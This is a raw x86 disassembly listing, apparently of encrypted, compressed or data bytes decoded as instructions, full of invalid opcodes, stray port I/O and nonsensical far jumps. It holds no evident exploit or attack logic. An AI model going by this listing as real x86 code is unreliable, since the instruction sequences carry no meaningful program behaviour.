  4158ff:	cmp    al,BYTE PTR [edx+0x40]
  415902:	(bad)  
  415903:	inc    edx
  415904:	xchg   ebx,eax
  415905:	test   DWORD PTR [edi+0x22af715],ebx
  41590b:	mov    eax,ds:0x36acabad
  415910:	aad    0xf0
  415912:	push   ds
  415913:	inc    edx
  415914:	mov    cl,0xee
  415916:	mov    esi,0x6b1b35fa
  41591b:	and    BYTE PTR [esi+0x55bb9577],ch
  415921:	inc    esi
  415922:	mov    cs,WORD PTR [ebx]
  415924:	pop    ebp
  415925:	sar    BYTE PTR [ebp-0x5a274a16],cl
  41592b:	dec    edi
  41592c:	(bad)  
  41592d:	jno    0x4158eb
  41592f:	lods   eax,DWORD PTR ds:[esi]
  415930:	or     BYTE PTR [ebx],bh
  415932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415933:	pop    es
  415934:	leave  
  415935:	xlat   BYTE PTR ds:[ebx]
  415936:	fistp  WORD PTR [ebx+0x10]
  415939:	push   ds
  41593a:	nop
  41593b:	push   es
  41593c:	and    eax,0xc728ce70
  415941:	fmul   QWORD PTR [eax+0x2e]
  415944:	loopne 0x415960
  415946:	add    bl,bh
  415948:	sub    DWORD PTR [eax-0x4a7c2927],eax
  41594e:	aam    0x33
  415950:	imul   ebx,DWORD PTR [ebx+0x1b],0x19
  415954:	mov    edi,0x608a957d
  415959:	pop    ebx
  41595a:	mul    DWORD PTR [ebx-0x42]
  41595d:	test   DWORD PTR [edi+0x73683f8a],ebx
  415963:	sub    eax,0x16f0f1ca
  415968:	push   ebx
  415969:	xchg   ecx,eax
  41596a:	add    DWORD PTR [ecx],0xffffff96
  41596d:	gs mov esp,0xc0ab68f6
  415973:	jbe    0x415982
  415975:	pop    ebp
  415976:	(bad)  
  415977:	stc    
  415978:	mov    esp,0x529c5dbd
  41597d:	ja     0x4159be
  41597f:	loop   0x4159c7
  415981:	xor    DWORD PTR es:[edx+0x65],ecx
  415985:	mov    DWORD PTR [ebx-0x59451975],edi
  41598b:	int    0xf
  41598d:	daa    
  41598e:	jbe    0x4159ab
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	adc    BYTE PTR [ebx+0x3c],cl
  415a03:	fsub   DWORD PTR [esp+eiz*8]
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	inc    ecx
  415a0d:	jl     0x415a53
  415a0f:	fucom  st(7)
  415a11:	xchg   edx,eax
  415a12:	mov    esi,0xf8e75af5
  415a17:	ror    DWORD PTR [ebx],1
  415a19:	mov    ebp,0x496ef21a
  415a1e:	jb     0x415a79
  415a20:	in     eax,0x99
  415a22:	(bad)  
  415a23:	repnz cmp eax,ebx
  415a26:	pop    ss
  415a27:	sbb    eax,0xf04da979
  415a2c:	sbb    ebp,ebp
  415a2e:	xchg   edi,eax
  415a2f:	sub    dl,bl
  415a31:	addr16 pop esi
  415a33:	xor    edi,DWORD PTR [ebx]
  415a35:	xor    BYTE PTR [ebp+0x7d1ddb02],dl
  415a3b:	jae    0x415abc
  415a3d:	(bad)  
  415a3e:	mov    ds:0x10358c48,al
  415a43:	mov    dl,BYTE PTR [ecx+edx*8-0x6fa0966e]
  415a4a:	aam    0x63
  415a4c:	int    0x84
  415a4e:	jmp    0x415a58
  415a50:	dec    esp
  415a51:	jno    0x415a05
  415a53:	loop   0x415ac7
  415a55:	inc    ebx
  415a56:	aas    
  415a57:	xchg   ecx,eax
  415a58:	pop    ebx
  415a59:	lds    eax,FWORD PTR [eax-0x56]
  415a5c:	sti    
  415a5d:	inc    edi
  415a5e:	inc    esp
  415a5f:	leave  
  415a60:	jge    0x415a3a
  415a62:	xchg   ebx,esi
  415a64:	jnp    0x415a7c
  415a66:	imul   BYTE PTR [ecx-0xfc5287]
  415a6c:	scas   eax,DWORD PTR es:[edi]
  415a6d:	retf   0x5ea2
  415a70:	jmp    0x44c5:0xc1cbf161
  415a77:	in     eax,0x52
  415a79:	mov    esi,0x7d418f26
  415a7e:	xchg   esi,eax
  415a7f:	dec    edx
  415a80:	(bad)  
  415a81:	je     0x415a15
  415a83:	bound  ebx,QWORD PTR [edx-0x5879212f]
  415a89:	fucomip st,st(6)
  415a8b:	js     0x415a10
  415a8d:	out    0x2c,eax
  415a8f:	mul    DWORD PTR ds:0xc48b0d06
  415a95:	sbb    dl,BYTE PTR [eax+0x79635083]
  415a9b:	pop    ds
  415a9c:	push   es
  415a9d:	in     al,0xf0
  415a9f:	xchg   esi,eax
  415aa0:	or     BYTE PTR [eax-0xb481667],0xf4
  415aa7:	sahf   
  415aa8:	mov    dl,0x0
  415aaa:	mov    esi,0xfa715e70
  415aaf:	pop    esi
  415ab0:	repnz push esi
  415ab2:	xor    cl,bh
  415ab4:	ds loop 0x415b16
  415ab7:	ins    DWORD PTR es:[edi],dx
  415ab8:	dec    BYTE PTR [esi-0x16]
  415abb:	(bad)
  415abe:	adc    BYTE PTR [ecx],ch
  415ac0:	repnz xchg edi,eax
  415ac2:	mov    esp,0x4e338d09
  415ac7:	movzx  esp,WORD PTR [esi+edi*2-0x37ed9984]
  415acf:	aam    0x2a
  415ad1:	dec    eax
  415ad2:	int3   
  415ad3:	push   cs
  415ad4:	iret   
  415ad5:	cmp    BYTE PTR [edi+edi*8-0x1c],al
  415ad9:	or     cl,ch
  415adb:	loopne 0x415b13
  415add:	jp     0x415b23
  415adf:	cmp    al,0xd3
  415ae1:	sub    BYTE PTR [edi-0x638c4208],dh
  415ae7:	xchg   edi,eax
  415ae8:	addr16 mov edx,ebp
  415aeb:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  415aed:	cmp    DWORD PTR [eax+esi*8+0x2b],0x4e
  415af2:	sub    eax,0x36fab5f3
  415af7:	adc    dl,BYTE PTR [esi-0x249fe029]
  415afd:	ja     0x415ae4
  415aff:	ja     0x415aba
  415b01:	pop    ss
  415b02:	int    0x70
  415b04:	test   DWORD PTR ss:[edi+edx*4],eax
  415b08:	sbb    al,dl
  415b0a:	cdq    
  415b0b:	xor    DWORD PTR [edx],0xa614af
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	(bad)  
  415b81:	or     BYTE PTR [eax-0x4c],bl
  415b84:	sub    ch,ah
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    al,0x1
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	enter  0x4c3b,0xd5
  415b90:	aaa    
  415b91:	lods   eax,DWORD PTR ds:[esi]
  415b92:	pop    edi
  415b93:	loop   0x415bfa
  415b95:	or     al,0x2
  415b97:	push   edx
  415b98:	ja     0x415b58
  415b9a:	sub    al,0xb9
  415b9c:	dec    ebx
  415b9d:	hlt    
  415b9e:	mov    al,BYTE PTR [ebp+0x1d7ad47]
  415ba4:	cmp    esi,DWORD PTR [ebp+0x73]
  415ba7:	push   ds
  415ba8:	sahf   
  415ba9:	push   esi
  415baa:	cmp    al,0x79
  415bac:	fs popf 
  415bae:	cmp    BYTE PTR [edx+0x3a4f2937],dl
  415bb4:	xchg   esi,eax
  415bb5:	pushf  
  415bb6:	sub    eax,0x7176815b
  415bbb:	fstp   DWORD PTR [ebx]
  415bbd:	or     esi,DWORD PTR [eax+0x77]
  415bc0:	nop
  415bc1:	div    BYTE PTR [edx]
  415bc3:	js     0x415be7
  415bc5:	dec    ebp
  415bc6:	pushf  
  415bc7:	cwde   
  415bc8:	aad    0xf3
  415bca:	out    0x2,al
  415bcc:	jl     0x44c7b2a8
  415bd2:	popa   
  415bd3:	out    dx,al
  415bd4:	and    al,ch
  415bd6:	call   0x6715:0xaca0eba7
  415bdd:	jno    0x415c0d
  415bdf:	aad    0xee
  415be1:	or     ecx,ebx
  415be3:	cmp    DWORD PTR [ebx-0x60],ebp
  415be6:	ud1    ebp,ebp
  415be9:	dec    eax
  415bea:	ins    BYTE PTR es:[edi],dx
  415beb:	popa   
  415bec:	test   eax,esp
  415bee:	ja     0x415bee
  415bf0:	in     eax,dx
  415bf1:	lods   eax,DWORD PTR ds:[esi]
  415bf2:	jns    0x415ba8
  415bf4:	hlt    
  415bf5:	jae    0x415b83
  415bf7:	adc    BYTE PTR ds:0x97a30d60,ah
  415bfd:	xchg   esi,eax
  415bfe:	inc    eax
  415bff:	push   edx
  415c00:	mov    dl,0xe2
  415c02:	or     eax,0xf8fd9a9d
  415c07:	cmp    DWORD PTR cs:[edx+0xe],esp
  415c0b:	out    dx,eax
  415c0c:	mov    al,0xc6
  415c0e:	cs ss aad 0xfa
  415c12:	jl     0x415bbb
  415c14:	adc    eax,0x9ee34908
  415c19:	les    edx,FWORD PTR [edi]
  415c1b:	jo     0x415c87
  415c1d:	retf   
  415c1e:	das    
  415c1f:	jo     0x415c81
  415c21:	test   DWORD PTR [edi],esp
  415c23:	repz dec DWORD PTR [eax+0x18]
  415c27:	cmc    
  415c28:	fild   WORD PTR [edi+edi*1+0x3ec03d38]
  415c2f:	mov    cl,0x97
  415c31:	mov    ebp,0x452e4544
  415c36:	data16 in al,dx
  415c38:	cmp    BYTE PTR [ebx-0x3ff32a36],bh
  415c3e:	(bad)
  415c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c42:	pop    ss
  415c43:	xchg   ebx,eax
  415c44:	mov    dh,0x5d
  415c46:	jo     0x415bcc
  415c48:	xchg   edi,eax
  415c49:	xor    al,0x42
  415c4b:	in     al,dx
  415c4c:	cmp    DWORD PTR [esp+ebx*1+0x35c5e164],0xf403af34
  415c57:	xchg   edi,eax
  415c58:	and    dh,0x69
  415c5b:	sbb    al,0xf2
  415c5d:	stos   BYTE PTR es:[edi],al
  415c5e:	jp     0x415c5f
  415c60:	inc    ebp
  415c61:	inc    esp
  415c62:	fsubr  st(4),st
  415c64:	mov    edi,0x94cb1c28
  415c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c6a:	pop    es
  415c6b:	hlt    
  415c6c:	or     al,0x34
  415c6e:	lods   eax,DWORD PTR ds:[esi]
  415c6f:	fwait
  415c70:	aas    
  415c71:	inc    ebx
  415c72:	aas    
  415c73:	jns    0x415c5c
  415c75:	cld    
  415c76:	iret   
  415c77:	inc    eax
  415c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c79:	adc    ah,al
  415c7b:	ds and al,0x34
  415c7e:	mov    ch,0x5c
  415c80:	mov    dl,0x42
  415c82:	psrad  mm4,mm2
  415c85:	pop    ss
  415c86:	cmp    DWORD PTR [esi-0x35],eax
  415c89:	ja     0x415c72
  415c8b:	dec    ebx
  415c8c:	ja     0x415c29
  415c8e:	inc    ebx
  415c8f:	inc    BYTE PTR [eax]
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xf820341f
  415d03:	icebp  
  415d04:	sub    al,0xe6
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	xchg   esp,eax
  415d0d:	and    al,0x4d
  415d0f:	mov    eax,0x8d169c45
  415d14:	xchg   edx,eax
  415d15:	sbb    eax,DWORD PTR [ebx-0x5d]
  415d18:	fnsave [esi-0x6bd50844]
  415d1e:	imul   ecx,DWORD PTR [edx-0xec67340],0x36
  415d25:	enter  0x480,0xd4
  415d29:	imul   eax,DWORD PTR [edx],0x540f9840
  415d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d30:	hlt    
  415d31:	hlt    
  415d32:	or     BYTE PTR [edx],dl
  415d34:	popf   
  415d35:	inc    ebx
  415d36:	call   0x220cbc8f
  415d3b:	mov    al,ds:0xebee9b9c
  415d40:	test   eax,0x93ecd94d
  415d45:	sub    edx,ebx
  415d47:	fimul  WORD PTR ds:0xf44c1b76
  415d4d:	xor    DWORD PTR [ebp-0x76a096c2],0x77
  415d54:	jne    0x415dae
  415d56:	mov    edi,DWORD PTR [ebx]
  415d58:	pop    ecx
  415d59:	idiv   BYTE PTR [ebx+0x20b93222]
  415d5f:	(bad)  
  415d60:	xor    eax,0x6311fd99
  415d65:	scas   al,BYTE PTR es:[edi]
  415d66:	test   DWORD PTR [edx+0x54b85b86],esp
  415d6c:	out    dx,al
  415d6d:	push   ecx
  415d6e:	stos   BYTE PTR es:[edi],al
  415d6f:	sub    DWORD PTR [ebp+0x68],0xffffffd9
  415d73:	sub    DWORD PTR [esp+eiz*2+0x2d],eax
  415d77:	test   eax,0x3f058490
  415d7c:	(bad)  
  415d7d:	shr    BYTE PTR [ecx],1
  415d7f:	dec    ebx
  415d80:	push   0x4a26c072
  415d85:	jecxz  0x415d75
  415d87:	leave  
  415d88:	femms  
  415d8a:	ins    BYTE PTR es:[edi],dx
  415d8b:	cwde   
  415d8c:	mov    edi,DWORD PTR [edx+ebx*8]
  415d8f:	xor    eax,0xdb8025e
  415d94:	out    0x25,eax
  415d96:	push   edx
  415d97:	push   ebx
  415d98:	pop    esi
  415d99:	jg     0x415de0
  415d9b:	test   DWORD PTR [esi],ecx
  415d9d:	ficom  WORD PTR [esi+0x12e398ab]
  415da3:	mov    cl,0x40
  415da5:	pusha  
  415da6:	mov    bh,0x7a
  415da8:	cwde   
  415da9:	cli    
  415daa:	call   0x5acae81f
  415daf:	fwait
  415db0:	fs mov edx,0xab8f0934
  415db6:	adc    BYTE PTR [edx-0x49],ah
  415db9:	pop    ss
  415dba:	dec    esi
  415dbb:	int3   
  415dbc:	xchg   esp,eax
  415dbd:	(bad)  
  415dbe:	jo     0x415d81
  415dc0:	mov    bh,BYTE PTR [ecx+eiz*1-0x763f0596]
  415dc7:	inc    ecx
  415dc8:	ret    0xe55a
  415dcb:	and    eax,0x3d1c21be
  415dd0:	sbb    eax,0x1a410cbd
  415dd5:	pushf  
  415dd6:	push   ds
  415dd7:	mov    ah,0x95
  415dd9:	dec    eax
  415dda:	or     al,0x50
  415ddc:	sub    al,0x56
  415dde:	neg    DWORD PTR [ebx+0x42]
  415de1:	add    ebp,esp
  415de3:	aam    0x1
  415de5:	mov    ds,WORD PTR [edi-0x662bdf73]
  415deb:	addr16 pop edx
  415ded:	stos   DWORD PTR es:[edi],eax
  415dee:	xlat   BYTE PTR ds:[ebx]
  415def:	retf   0x6262
  415df2:	cmc    
  415df3:	jns    0x415de9
  415df5:	pop    edx
  415df6:	sbb    al,0x63
  415df8:	cmp    DWORD PTR [ebp+eax*2+0x3e5197a4],0xc0cfbba0
  415e03:	jle    0x415da6
  415e05:	push   esp
  415e06:	xor    edx,DWORD PTR [edi]
  415e08:	sbb    ecx,DWORD PTR [edi+0x1e57e385]
  415e0e:	push   ebx
  415e0f:	stos   DWORD PTR es:[edi],eax
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x23]
  415e81:	shl    BYTE PTR [eax-0x16],1
  415e84:	xor    bh,ah
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	dec    ebp
  415e8d:	repnz jmp FWORD PTR [esi+0x454e134d]
  415e94:	and    eax,0x6d5aecf9
  415e99:	push   edx
  415e9a:	aaa    
  415e9b:	bound  eax,QWORD PTR [edx+edx*1-0x60234869]
  415ea2:	and    esi,esi
  415ea4:	inc    esi
  415ea5:	test   DWORD PTR [esi],eax
  415ea7:	add    al,0x25
  415ea9:	loop   0x415ec9
  415eab:	sbb    al,0xcb
  415ead:	fdivr  QWORD PTR [ebx]
  415eaf:	rcr    DWORD PTR [ebx+0x12],1
  415eb2:	sbb    edx,DWORD PTR [edx+0x24]
  415eb5:	into   
  415eb6:	add    DWORD PTR [eax-0xaef2a88],esi
  415ebc:	ds xchg esp,eax
  415ebe:	fstp   TBYTE PTR [edi-0x2d727939]
  415ec4:	scas   al,BYTE PTR es:[edi]
  415ec5:	mov    bl,0xf
  415ec7:	pusha  
  415ec8:	and    al,0xe9
  415eca:	xchg   esp,eax
  415ecb:	mov    ch,0x50
  415ecd:	fbld   TBYTE PTR [edx+ebx*4]
  415ed0:	inc    esp
  415ed1:	std    
  415ed2:	mov    ?,WORD PTR [ecx+0x4296f296]
  415ed8:	inc    eax
  415ed9:	in     eax,0x29
  415edb:	gs lock gs scas eax,DWORD PTR es:[edi]
  415edf:	xlat   BYTE PTR ds:[ebx]
  415ee0:	cwde   
  415ee1:	leave  
  415ee2:	cwde   
  415ee3:	iret   
  415ee4:	ins    BYTE PTR es:[edi],dx
  415ee5:	lds    ecx,FWORD PTR [ebp-0x2ecced9b]
  415eeb:	dec    edx
  415eec:	sub    eax,0xc8c23f0f
  415ef1:	and    DWORD PTR [ecx+0x1cfe1e3],edx
  415ef7:	push   esi
  415ef8:	jo     0x415f49
  415efa:	lods   eax,DWORD PTR ds:[esi]
  415efb:	mul    BYTE PTR [eax+0x404f446f]
  415f01:	pop    esp
  415f02:	call   0xd14f1e4f
  415f07:	jo     0x415f45
  415f09:	out    0xbf,eax
  415f0b:	dec    ebp
  415f0c:	sbb    eax,0x46ef35e7
  415f11:	cmp    DWORD PTR [eax],ebx
  415f13:	sub    edx,edi
  415f15:	mov    ds:0xe8d383ae,eax
  415f1a:	jne    0x415f85
  415f1c:	jo     0x415f1c
  415f1e:	or     bh,cl
  415f20:	adc    DWORD PTR [ecx-0x7b9d0587],ebx
  415f26:	ins    DWORD PTR es:[edi],dx
  415f27:	adc    bh,al
  415f29:	es mov al,es:0xf9b348cd
  415f30:	popf   
  415f31:	lds    esi,FWORD PTR [ecx+0x4c47276]
  415f37:	cmp    edx,DWORD PTR [esi]
  415f39:	and    bl,bh
  415f3b:	mov    eax,ds:0xc25f9612
  415f40:	imul   edx,DWORD PTR [ebx],0x7f30e58
  415f46:	mov    eax,edx
  415f48:	mov    dl,0x32
  415f4a:	add    BYTE PTR [eax],bl
  415f4c:	sbb    ebp,DWORD PTR [esi-0x20]
  415f4f:	push   esi
  415f50:	push   edx
  415f51:	adc    dl,BYTE PTR [esi+0x1e]
  415f54:	pop    ebx
  415f55:	out    0xd0,eax
  415f57:	je     0x415f57
  415f59:	arpl   WORD PTR [eax+0x0],di
  415f5c:	cli    
  415f5d:	(bad)  
  415f5e:	ffreep st(5)
  415f60:	sar    bl,cl
  415f62:	jge    0x415fe3
  415f64:	pusha  
  415f65:	leave  
  415f66:	pop    es
  415f67:	imul   edx,DWORD PTR [ecx],0xffffffde
  415f6a:	in     eax,0x56
  415f6c:	inc    ebx
  415f6d:	lea    ebx,[ecx]
  415f6f:	inc    ebx
  415f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f71:	enter  0xd533,0xee
  415f75:	test   DWORD PTR [ebp+edi*1+0x5992ae08],eax
  415f7c:	gs scas eax,DWORD PTR es:[edi]
  415f7e:	shl    BYTE PTR [edx+0x13],0xf8
  415f82:	inc    esi
  415f83:	mov    al,ds:0x916d20f1
  415f88:	mov    edi,0xa2861adc
  415f8d:	xchg   esp,eax
  415f8e:	in     al,dx
  415f8f:	mov    BYTE PTR [eax],al
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	sbb    edi,DWORD PTR [ecx-0x9]
  416003:	inc    esi
  416004:	xor    al,0xe8
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	or     DWORD PTR [edi+0x57],0x77214deb
  416013:	xchg   ecx,eax
  416014:	mov    esp,0x3ae840c4
  416019:	or     DWORD PTR [edi],ebx
  41601b:	jge    0x415fda
  41601d:	ss scas al,BYTE PTR es:[edi]
  41601f:	ret    
  416020:	iret   
  416021:	mov    ebp,esi
  416023:	cdq    
  416024:	mov    ds:0xde4e3946,al
  416029:	or     esp,DWORD PTR [eax-0x6b]
  41602c:	add    DWORD PTR [edi+0x33],edi
  41602f:	push   ebp
  416030:	aas    
  416031:	mov    dh,0x20
  416033:	push   ebp
  416034:	fs cmp esi,eax
  416037:	loop   0x41604f
  416039:	(bad)  
  41603a:	pop    esp
  41603b:	jmp    0x1e3b:0xfa9cf392
  416042:	sti    
  416043:	sbb    edi,DWORD PTR [edx+ecx*1]
  416046:	inc    edx
  416047:	mov    ebp,0x22db9822
  41604c:	push   DWORD PTR [edi-0x7e]
  41604f:	add    ebx,DWORD PTR [esi-0x79]
  416052:	dec    ecx
  416053:	lock jns 0x416029
  416056:	xor    DWORD PTR [ebx],esi
  416058:	into   
  416059:	push   esi
  41605a:	sub    DWORD PTR [eax-0x5f515792],esp
  416060:	jle    0x415ffd
  416062:	xchg   edx,eax
  416063:	adc    eax,ecx
  416065:	or     ebp,ecx
  416067:	xchg   esp,eax
  416068:	mov    bh,0x26
  41606a:	in     eax,0xd2
  41606c:	adc    ecx,DWORD PTR [ebx]
  41606e:	mov    ecx,0xa9597292
  416073:	fdiv   QWORD PTR [ebx+0x5a61fcd4]
  416079:	inc    ebp
  41607a:	aam    0xad
  41607c:	inc    ecx
  41607d:	popa   
  41607e:	lahf   
  41607f:	iret   
  416080:	jne    0x4160f3
  416082:	sub    eax,0xf8712ce1
  416087:	fldcw  WORD PTR [ebp+0x27fcaf2e]
  41608d:	mov    edx,0x811e95a9
  416092:	mov    cl,dh
  416094:	push   0xd
  416096:	xchg   ebx,eax
  416097:	mov    DWORD PTR [eax+ebp*8+0x35be438c],0xd877d727
  4160a2:	(bad)  
  4160a4:	(bad)  
  4160a5:	cwde   
  4160a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160a7:	(bad)  
  4160a8:	(bad)  [edi+0x22]
  4160ab:	ffreep st(7)
  4160ad:	aam    0xf0
  4160af:	cdq    
  4160b0:	cmp    DWORD PTR [eax-0x4b437f30],edi
  4160b6:	imul   cl
  4160b8:	sbb    eax,0x108d96fd
  4160bd:	out    dx,al
  4160be:	adc    ebp,ebx
  4160c0:	pusha  
  4160c1:	sub    BYTE PTR [edx-0x50b9ab95],dh
  4160c7:	xor    eax,0x5c874fb7
  4160cc:	(bad)  
  4160cd:	push   ecx
  4160ce:	aaa    
  4160cf:	sahf   
  4160d0:	outs   dx,DWORD PTR ds:[esi]
  4160d1:	sub    eax,0x434993d1
  4160d6:	dec    edx
  4160d7:	cmp    DWORD PTR [ebx+0x53],0xb7bb7dcf
  4160de:	addr16 mov ds:0x9cea,eax
  4160e2:	retf   0xcff4
  4160e5:	stos   BYTE PTR es:[edi],al
  4160e6:	jne    0x4160b1
  4160e8:	jno    0x41613e
  4160ea:	mov    DWORD PTR [edi],ebx
  4160ec:	ficom  WORD PTR [edi+0x5ca0f2ce]
  4160f2:	sbb    ch,BYTE PTR [eax-0x9eb74e7]
  4160f8:	int    0x1b
  4160fa:	and    al,dh
  4160fc:	jnp    0x416150
  4160fe:	pop    ds
  4160ff:	rol    BYTE PTR [esi+ebp*2+0x14b6c19],cl
  416106:	in     al,0xb5
  416108:	jne    0x4160c8
  41610a:	push   ss
  41610b:	repnz and ch,dh
  41610e:	popa   
  41610f:	aad    0x0
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0xec5764f3
  416183:	ret    0xe938
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	push   esi
  41618d:	mov    es,WORD PTR [ebx-0x46d4d840]
  416193:	fwait
  416194:	ret    
  416195:	and    eax,0x50b07cb8
  41619a:	lods   al,BYTE PTR ds:[esi]
  41619b:	adc    edx,DWORD PTR [ebx-0x74]
  41619e:	adc    cl,BYTE PTR [ebp+0x38]
  4161a1:	xor    BYTE PTR [ebx-0x5b],dh
  4161a4:	mov    bl,0xfe
  4161a6:	xor    BYTE PTR [edi+0x2a205862],0xde
  4161ad:	scas   al,BYTE PTR es:[edi]
  4161ae:	outs   dx,BYTE PTR ds:[esi]
  4161af:	sub    al,0xab
  4161b1:	and    ebp,0x2c
  4161b4:	sub    DWORD PTR [edi+0x6b508bb],esp
  4161ba:	out    0x8f,eax
  4161bc:	mov    ebp,0x398d96a4
  4161c1:	add    DWORD PTR [esi+ecx*8],esp
  4161c4:	je     0x4161c6
  4161c6:	adc    cl,BYTE PTR [edi]
  4161c8:	push   edx
  4161c9:	jp     0x4161db
  4161cb:	loopne 0x4161a1
  4161cd:	or     DWORD PTR [ebx],esp
  4161cf:	xor    DWORD PTR [edx],edx
  4161d1:	xor    esi,DWORD PTR [ecx]
  4161d3:	sub    eax,0x713bce7d
  4161d8:	test   BYTE PTR [edx],dl
  4161da:	and    al,0xe5
  4161dc:	test   eax,0x5e55c173
  4161e1:	rcr    DWORD PTR [ecx-0x24],cl
  4161e4:	or     BYTE PTR [esp+eiz*8],al
  4161e7:	sbb    eax,0x6a45e332
  4161ec:	loop   0x416190
  4161ee:	jle    0x4161d1
  4161f0:	gs cs mov eax,0xf25632e2
  4161f7:	shl    BYTE PTR [eax+0x20],cl
  4161fa:	(bad)  
  4161fb:	(bad)  
  4161fc:	out    0xa6,al
  4161fe:	stos   BYTE PTR es:[edi],al
  4161ff:	call   0x66b3:0x4e656b97
  416206:	gs (bad) 
  416208:	mov    ecx,0xfedcda73
  41620d:	jecxz  0x41624b
  41620f:	loop   0x4161f0
  416211:	std    
  416212:	fucomi st,st(5)
  416214:	mov    bh,BYTE PTR [esi]
  416216:	add    esi,edi
  416218:	les    esp,FWORD PTR [edi+0x9e99f07]
  41621e:	cmp    BYTE PTR [ebx-0x64f3fad],0xb
  416225:	xchg   ebx,eax
  416226:	add    ah,BYTE PTR [edx-0x3ae3d4e9]
  41622c:	mov    dh,0xa8
  41622e:	sub    eax,0xd524986b
  416233:	jg     0x416211
  416235:	lea    eax,ds:0xcfaad404
  41623b:	cmp    eax,0x5df69ede
  416240:	pop    edi
  416241:	mov    cl,0xc1
  416243:	and    al,0x94
  416245:	jnp    0x41629a
  416247:	sub    eax,edx
  416249:	test   eax,0x8527d3bc
  41624e:	push   es
  41624f:	mov    cl,0xdb
  416251:	sti    
  416252:	mov    edi,0x13ef5c70
  416257:	fcmovbe st,st(5)
  416259:	dec    esi
  41625a:	cdq    
  41625b:	xchg   esi,eax
  41625c:	fbld   TBYTE PTR [ecx+ebp*8+0xa18b2d3]
  416263:	jns    0x41622d
  416265:	push   esp
  416266:	mov    ecx,0xbe793e7b
  41626b:	sub    DWORD PTR [edi-0x2a],ecx
  41626e:	xor    eax,0x6d21dac5
  416273:	pop    esp
  416274:	js     0x41622b
  416276:	xor    ebx,DWORD PTR [edx-0x7e]
  416279:	dec    ecx
  41627a:	pop    esp
  41627b:	ss mov al,dl
  41627e:	xchg   edi,eax
  41627f:	sbb    DWORD PTR [ebx],ebx
  416281:	pop    ds
  416282:	pop    esp
  416283:	mov    esi,0xc579b7e0
  416288:	or     ecx,eax
  41628a:	sub    DWORD PTR [esi-0x78bc5697],ebx
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c96:0xd9a91ee
  416305:	jmp    0x0:0x1040000
  41630c:	ins    BYTE PTR es:[edi],dx
  41630d:	test   DWORD PTR [edx+esi*8+0x718601b5],edi
  416314:	cmp    dl,0x15
  416317:	mov    esp,0xd984b62d
  41631c:	inc    ecx
  41631d:	xchg   ecx,esi
  41631f:	xor    BYTE PTR [ebx+0x6e86c3d],dh
  416325:	push   ds
  416326:	and    esp,esp
  416328:	lahf   
  416329:	es test eax,esi
  41632c:	xchg   edi,eax
  41632d:	in     eax,0xbd
  41632f:	outs   dx,BYTE PTR ds:[esi]
  416330:	les    ebp,FWORD PTR ds:0x1d5fde15
  416336:	ins    BYTE PTR es:[edi],dx
  416337:	push   es
  416338:	sbb    ebp,ebx
  41633a:	aas    
  41633b:	or     dh,al
  41633d:	inc    edi
  41633e:	adc    DWORD PTR [ecx-0x47],0x5f
  416342:	pop    es
  416343:	in     al,dx
  416344:	pop    esi
  416345:	mov    al,ds:0x6aaae12f
  41634a:	ror    DWORD PTR [eax+0x7698fc17],0x5f
  416351:	xor    DWORD PTR [eax],edx
  416353:	jl     0x41634c
  416355:	cmp    ebp,DWORD PTR [edi+0x1b7119dd]
  41635b:	test   al,0xb5
  41635d:	leave  
  41635e:	aad    0x42
  416360:	movsx  edx,BYTE PTR [esi+edx*8]
  416364:	loope  0x41638c
  416366:	pop    esp
  416367:	in     al,0x25
  416369:	inc    edi
  41636a:	mov    al,ds:0x18c98905
  41636f:	stos   BYTE PTR es:[edi],al
  416370:	inc    ebp
  416371:	xchg   esi,eax
  416372:	sahf   
  416373:	data16 jno 0x4163cc
  416376:	jge    0x41637a
  416378:	xchg   esp,esi
  41637a:	or     al,0x8
  41637c:	icebp  
  41637d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
